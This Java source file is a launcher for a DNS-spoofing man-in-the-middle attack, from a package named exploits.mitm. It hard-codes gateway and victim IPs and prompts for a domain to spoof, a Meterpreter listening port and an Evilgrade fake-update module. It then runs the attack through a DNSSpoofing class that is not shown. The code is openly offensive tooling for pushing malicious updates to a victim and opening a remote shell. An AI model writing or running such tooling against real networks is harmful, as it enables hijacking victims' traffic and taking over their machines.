package exploits.mitm;

import java.io.IOException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class TestDNS 
{
	public static void main (String[]args) throws UnknownHostException
	{
	    List<String> gatewayIPs = new ArrayList<String>();
            List<String> victimIPs = new ArrayList<String>();
            
            gatewayIPs.add("192.168.2.130");
            victimIPs.add("192.168.2.133");
            
	        // asked user for domain to use
		DNSSpoofing spoofer = new DNSSpoofing(gatewayIPs, victimIPs);
		Scanner user_input = new Scanner(System.in);
		
		String domain;
		System.out.print("What domain do you want to use to spoof?\n)");
		
		while (true) 
		{
                    domain = user_input.next();
                    
                   if ((domain == null) || domain.isEmpty()) 
                   {
                         System.out.print("Input was empty. Please provide a domain: \n");
                         continue;
                   }
                   else 
                       break;
                }
	
		spoofer.setSpoofDomain(domain);
		
		
		
		// asked user for lPort to use
		String lPort;
		System.out.print("LPORT: 8675 Would you like to change it? If not, press enter.\n)");
		
		while (true) 
		{
		    lPort = user_input.next();
		    
	            if (lPort.isEmpty())
	            {
	        	lPort = "8675";
	        	break;
	            } 
	            else 
	            {
	        	try 
	        	{
	        	    Integer.parseInt(lPort);
	        	    break;
	        	} 
	        	catch(NumberFormatException ex) 
	        	{
	        	    System.out.print("Only numbers exepted for the LPORT");
	        	}
	            }
		}
		
		spoofer.setMeterpreterLPort(lPort);
		
		String evilgradeModule;
		System.out.print("What module do you want to configure in Evilgrade?\n)");
                
                while (true) 
                {
                    evilgradeModule = user_input.next();
                    
                   if ((evilgradeModule == null) || evilgradeModule.isEmpty()) 
                   {
                         System.out.print("Input was empty. Please provide a module: \n");
                         continue;
                   }
                   else 
                       break;
                }
        
                spoofer.setModuleEvilgrade(evilgradeModule);
		
		
		try
        {
            spoofer.runAttack();
        }
        catch (IOException e)
        {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
	}
	
}
